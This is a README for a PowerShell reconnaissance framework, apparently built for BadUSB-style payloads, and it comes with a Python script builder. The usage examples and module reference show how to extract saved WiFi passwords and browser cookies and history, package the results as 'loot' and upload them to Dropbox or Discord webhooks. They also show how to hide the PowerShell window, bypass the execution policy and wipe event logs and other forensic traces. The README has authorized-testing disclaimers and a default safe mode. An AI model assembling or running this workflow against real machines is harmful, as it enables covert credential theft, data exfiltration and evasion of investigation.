# Small PowerShell Recon Framework

A modular, auditable framework for Windows reconnaissance and security testing. Designed for **authorized security research and red team**. Inspired by curiousity and experimentation in regards to the BadUSB.

## Legal Notice

**THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY**

- Use ONLY on systems you own or have permission to test
- Intended for isolated environments
- Educational/research purposes
- NEVER use on production systems without authorization

By using this framework, you agree to comply with all applicable laws and regulations.

---

## Features

### Safe Mode (Default)
- **System Information**: Hardware specs, OS details, network configuration
- **User Reconnaissance**: User accounts, recent files, PowerShell history
- **Popup Messages**: Customizable demonstration popups
- **Logging**: Comprehensive audit trail of all operations

### Unsafe Mode (Requires `--allow-unsafe`)
- **WiFi Extraction**: Saved profiles with passwords (requires admin)
- **Browser Data**: History, bookmarks, cookies from Chrome/Edge/Firefox
- **Data Exfiltration**: Upload via Dropbox or Discord webhooks
- **Anti-Forensics**: Comprehensive cleanup and trace removal

### Framework Features
- **Modular Architecture**: Pick and choose capabilities
- **Dual-Mode Safety**: Safe by default, explicit opt-in for sensitive operations
- **Runtime Protection**: SafeMode stubs prevent accidental data exfiltration
- **Auditable Output**: Generate reviewable scripts before execution
- **Environment Management**: Secure credential handling via `.env` files

---

## Start

### Installation

```bash
git clone https://github.com/snipsnapzz/ADV-recon.git
cd ADV-recon

pip install python-dotenv

cp .env.example .env
nano .env
```

### Generate a Safe Script

```bash
python builder.py --safemode
# Note: If you execute the popup_messages.ps1 module first, the victim will have to do the popup messages before the rest of the modules run.
python builder.py --safemode --modules popup_messages.ps1 system_info.ps1
python builder.py --safemode --modules system_info.ps1 --out safe.ps1
```

### Run the Generated Script

```powershell
notepad .\generated_main.ps1
powershell -ExecutionPolicy Bypass -File .\generated_main.ps1
Get-Content $env:TEMP\ps_builder_demo.log
```

---

## Usage

### Command-Line Options

| Option | Description |
|--------|-------------|
| `--safemode` | Use `modules/safe/` directory (default) |
| `--allow-unsafe` | Enable unsafe modules from `modules/` |
| `--modules` | Explicitly select modules by filename |
| `--out` | Output path (default: `generated_main.ps1`) |
| `--list` | List available modules and exit |
| `--no-config` | Exclude `config_template.ps1` |
| `--hide-window` | Include code to hide PowerShell window |
| `--dryrun` | Preview without writing file |

### Example Workflows

#### 1. Basic System Reconnaissance (Safe)

```bash
python builder.py --safemode \
  --modules system_info.ps1 \
  --out system_check.ps1
```

#### 2. Full User Audit (Safe)

```bash
python builder.py --safemode \
  --modules system_info.ps1 user_recon.ps1 \
  --out user_audit.ps1
```

#### 3. WiFi Password Extraction (Unsafe - Admin Required)

```bash
python builder.py --allow-unsafe \
  --modules wifi_info.ps1 \
  --out wifi_extract.ps1

powershell -ExecutionPolicy Bypass -File .\wifi_extract.ps1
```

#### 4. Comprehensive Recon with Exfiltration (Unsafe)

```bash
python builder.py --allow-unsafe \
  --modules system_info.ps1 user_recon.ps1 wifi_info.ps1 browser_data.ps1 exfiltration.ps1 \
  --hide-window \
  --out full_recon.ps1
```

**Note:** Edit the generated script to uncomment exfiltration calls before running.

---

## Config

### Environment Variables (`.env`)

```env
DROPBOX_TOKEN=your_dropbox_access_token_here
DISCORD_WEBHOOK=https://discord.com/api/webhooks/YOUR_WEBHOOK_URL
```

**Setup Guides:**
- [Dropbox API Setup](https://www.dropbox.com/developers/documentation)
- [Discord Webhook Setup](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)

### Script Configuration (`config_template.ps1`)

```powershell
$ScriptConfig = @{
    ProjectName = "PS-Recon-Framework"
    SafeMode    = $true
    Debug       = $true
    LogPath     = "$env:TEMP\ps_builder_demo.log"
}
```

---

## Module Reference

### Safe Modules

#### `popup_messages.ps1`
Shows message boxes. Completely harmless.

```powershell
Show-PopupMessages -Cycles 3
```

#### `system_info.ps1`
Collects hardware, OS, network, and security configuration.

```powershell
$data = Get-SystemInfo
Export-SystemInfoReport -OutputPath "system.txt" -Data $data
```

#### `user_recon.ps1`
Gathers user accounts, recent files, startup programs, processes.

```powershell
Export-UserReconReport -OutputPath "user_info.txt"
```

### Unsafe Modules

#### `wifi_info.ps1`
Extracts saved WiFi profiles and passwords. **Requires Administrator**.

```powershell
$profiles = Get-SavedWiFiProfiles -IncludePasswords
Export-WiFiReport -OutputPath "wifi.txt" -IncludePasswords
Send-WiFiToDiscord -WebhookUrl $DiscordWebhook
```

#### `browser_data.ps1`
Extracts browsing history, bookmarks, and cookies.

```powershell
Export-BrowserDataReport -OutputPath "browsers.txt"
$chromeHistory = Get-BrowserData -Browser Chrome -DataType History
Copy-FirefoxCookies -OutputFolder $LootFolder
```

#### `exfiltration.ps1`
Uploads collected data to cloud services.

```powershell
$lootPath = New-LootPackage -OutputFolder $env:TEMP -CustomName "target_recon"

Invoke-DataExfiltration `
    -LootFolder $lootPath `
    -DropboxToken $DropboxToken `
    -DiscordWebhook $DiscordWebhook `
    -CompressFirst `
    -CleanupAfter
```

#### `cleanup.ps1`
Removes forensic artifacts. **DESTRUCTIVE - Use with caution.**

```powershell
Invoke-ComprehensiveCleanup `
    -IncludeEventLogs `
    -IncludeBrowserCache `
    -IncludePrefetch `
    -Aggressive

Clear-PowerShellHistory
Clear-RunMRU
Clear-DNSCache
```

---

## Safety

### 1. Default Safe Mode
```python
safe_mode = True if args.safemode or not args.allow_unsafe else False
```

### 2. Runtime Stubs
In SafeMode, dangerous functions are replaced with simulated versions:

```powershell
if ($ScriptConfig.SafeMode) {
    function Send-ToDropbox {
        Write-Output "[SIMULATED] Dropbox upload (SafeMode)"
    }
}
```

### 3. Explicit Confirmation
Unsafe mode requires typing "YES":

```
!  WARNING: UNSAFE MODE ENABLED
Type 'YES' to continue with unsafe mode: 
```

### 4. Commented-Out Dangerous Calls
The builder includes dangerous operations as comments:

```powershell
# WiFi extraction (unsafe - requires admin)
# Export-WiFiReport -OutputPath "$LootFolder\wifi_info.txt" -IncludePasswords
```

You must manually uncomment to execute.

---

## Testing & Development

### Dry Run Mode

```bash
python builder.py --allow-unsafe --dryrun --modules wifi_info.ps1
```

### List Available Modules

```bash
python builder.py --safemode --list
python builder.py --allow-unsafe --list
```

### Add Custom Modules

1. Create `.ps1` file in `modules/` or `modules/safe/`
2. Add function definitions
3. Update `MODULE_TO_MAIN_CALLS` in `builder.py`
4. Rebuild script

---

**Remember:** Dont be evil :)
